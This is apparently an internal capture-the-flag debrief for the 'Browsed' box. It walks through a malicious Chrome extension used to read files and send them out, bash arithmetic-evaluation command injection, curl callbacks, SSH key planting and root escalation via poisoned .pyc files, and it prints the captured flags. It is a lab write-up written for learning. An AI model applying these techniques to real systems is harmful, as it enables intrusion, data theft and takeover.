# Browsed — Internal Debrief
> For: Operator + AI Crew
> Box: Browsed | Completed: 2026-03-26 | Sessions: 1 | Elliot turns: N/A (manual operation)

## Operation Timeline
| Phase | What Happened |
|-------|---------------|
| Recon | Nmap full scan: SSH + HTTP. WhatWeb fingerprint. Homepage reveals Chrome extension upload portal. |
| Web Enum | Fetched upload.php, samples.html. Identified the upload-and-run-in-Chrome model. Downloaded sample extension (Fontify) to understand expected format. |
| Extension Recon (v1-v3) | Iterated through multiple extension versions. v1 confirmed file:// reads and internal services. v2 discovered Gitea on port 3000, port 5000 Flask app. v3 targeted Gitea API. Console truncation forced pivot to network exfiltration. |
| Extension Exfil (v4) | HTTP listener + extension fetch() POST. Full source exfiltration of app.py, routines.sh, /etc/passwd. Identified bash arith eval vector. |
| RCE Testing (v5-v6) | First RCE attempt failed — Flask decoded %2F in payload, breaking route match. Fixed by removing slashes from payload. Confirmed RCE with curl callback. |
| SSH Key Plant (v7) | Two-step delivery: download script to cwd, execute. SSH as larry confirmed. User flag captured. |
| Privesc Enum | sudo -l revealed /opt/extensiontool/extension_tool.py. Identified world-writable __pycache__. |
| Privesc Exploit | Generated malicious .pyc. First attempt segfaulted (local Python version mismatch). Compiled on target — clean execution. Root SSH key planted. Root flag captured. |

## What Worked Well

- **Extension-as-recon-platform** was the right mental model immediately. Recognizing that a Chrome service worker with `--no-sandbox` is essentially an SSRF primitive with file read capability shaped the entire approach.
- **Network exfiltration pivot** was the right call after console truncation wasted 2-3 extension uploads. The Python HTTP listener was simple and effective.
- **Slash-free payload design.** After identifying that Flask's URL decoding was breaking the RCE payload, the fix was clean: `curl host:port` needs no slashes, and the fetched script content can contain them freely.
- **Recognizing the .pyc poisoning vector.** World-writable `__pycache__` + sudo Python script = immediate flag. The `stat` check for mtime and size was methodical.

## What We Got Wrong (And What It Cost)

1. **Console.log truncation — 3 wasted extension uploads**
   - *What happened:* Tried logging file contents via `console.log()` in the Chrome extension, not realizing Chrome's `--v=1` stderr logging truncates long lines.
   - *Root cause:* Didn't research Chrome's verbose logging behavior before relying on it.
   - *Cost:* ~3 upload/poll cycles (~45 seconds each) plus iteration time.
   - *Fix:* Default to network exfiltration from the start. Console.log is unreliable for data exfil.

2. **URL encoding / Flask path separator issue — 2 wasted uploads**
   - *What happened:* Initial RCE payloads contained forward slashes (e.g., `curl http://host:port/path`). Flask decoded `%2F` as `/`, splitting the URL into segments that didn't match the route. Returned 404s.
   - *Root cause:* Didn't consider Flask's URL decoding behavior when constructing payloads.
   - *Cost:* ~2 upload/poll cycles plus debugging time.
   - *Fix:* Always audit payload characters against the transport layer's encoding rules before sending.

3. **Cross-compiled .pyc segfault — 1 wasted attempt**
   - *What happened:* Generated the malicious `.pyc` on the attack box (different Python version). The marshal format was incompatible, causing a segfault.
   - *Root cause:* Assumed Python marshal format is stable across minor versions. It isn't.
   - *Cost:* 1 failed sudo attempt + debugging time.
   - *Fix:* Always compile `.pyc` files on the target using the target's Python interpreter.

4. **No memoria logging throughout the operation**
   - *What happened:* Ran the entire box without logging to memoria. State tracking was entirely in conversation context.
   - *Root cause:* Manual operation without agent framework.
   - *Cost:* The debrief has less structured data to work from.
   - *Fix:* Even in manual ops, log key findings and credentials to memoria for writeup generation.

## Technical Lessons Learned

1. **Bash `[[ -eq ]]` arithmetic evaluation is a real-world primitive.** The array subscript trick `a[$(cmd)]` works because bash's arithmetic evaluator recursively processes expressions including command substitutions. This is distinct from `[ -eq ]` (the `test` builtin) which does plain integer comparison. The vulnerability exists whenever untrusted input reaches a `[[ ]]` arithmetic operator (`-eq`, `-ne`, `-lt`, `-le`, `-gt`, `-ge`).

2. **Chrome extension service workers have broad capabilities.** With `--no-sandbox`, a service worker can:
   - Read local files via `file://` protocol
   - Access all localhost services (no CORS in extension context for `fetch()`)
   - Exfiltrate data to external hosts
   - Persist across page navigations (it's a service worker, not a content script)

3. **Python .pyc invalidation is mtime-based by default.** The `.pyc` header stores the source file's mtime and size. If both match the actual source file, Python loads the cached bytecode. There's no content hash or signature verification. The `flags` field at offset 4 determines the invalidation strategy: `0` = timestamp, `1` = hash-based. Most Python installations use timestamp-based.

4. **Flask URL path decoding matters for exploit delivery.** Flask/Werkzeug decodes percent-encoded characters in URL paths, including `%2F` → `/`. This creates path segment boundaries that break route matching. Payloads routed through URL paths must avoid `/` or use alternative encoding strategies.

## Methodology Wins

- **Iterative extension development** was natural — each upload provided feedback that informed the next version. The 10-second Chrome timeout forced efficient payload design.
- **Two-step RCE delivery** (download then execute) cleanly separated the transport constraint (no slashes) from the execution requirement (script with slashes).
- **SSH key planting** over reverse shells was the right persistence strategy — stable, re-entrant, no dangling processes.

## IRONTHREAD Iteration Notes

1. **Memoria should be used even in manual ops.** The empty memoria state made this debrief harder to write. Consider adding a lightweight "manual mode" reminder or auto-logging at key milestones.

2. **WebDig needs a raw fetch mode.** Several extension uploads and polls were done via raw `curl` in Bash because the webdig_curl tool didn't support multipart file uploads (`-F` flag). Adding a `webdig_upload` tool would streamline this.

3. **SOVA `add_hosts` timed out.** The 10-second timeout on the `sova_add_hosts` tool was too short for the sudo operation. Had to fall back to manual `echo | sudo tee`. Consider increasing the timeout or using a different elevation strategy.

4. **seclists paths were wrong.** Both gobuster and ffuf failed because seclists wasn't installed at the expected paths. SOVA/WebDig should detect available wordlists at startup and use fallbacks.

## What We'd Do Differently Next Time

1. Start with network exfiltration for Chrome extension payloads — skip console.log entirely.
2. Audit payload characters against the transport layer before first RCE attempt.
3. Always compile `.pyc` on the target, never cross-compile.
4. Log to memoria throughout the operation, even without the agent framework.
5. Check for seclists/wordlist availability early in recon, install if missing.

## Stats
| Metric | Value |
|--------|-------|
| Time to user | ~30 minutes |
| Time to root | ~45 minutes |
| Extension uploads | ~8 |
| Unique attack techniques | 3 (malicious extension, bash arith eval, pyc poisoning) |
| Failed approaches | 0 (all vectors identified were correct) |
| Key pivots | 2 (console→network exfil, slash-free payloads) |

## CVE Reference Card
| CVE | Product | Primitive | How We Used It |
|-----|---------|-----------|----------------|
| N/A | Bash `[[ -eq ]]` | Arithmetic evaluation executes `$(cmd)` in operands | RCE as larry via Flask routines endpoint |
| N/A | Python `__pycache__` | Timestamp-based .pyc invalidation with no integrity check | Privesc to root via poisoned bytecode cache |
| N/A | Chrome `--no-sandbox` | Extension service workers can read `file://` and access localhost | Internal service enumeration + file read |

## Flags
```
user.txt: 18743a6a8c6e560846782d46205fdc5e
root.txt: 1f036d0839072a19df5af0397076e460
```
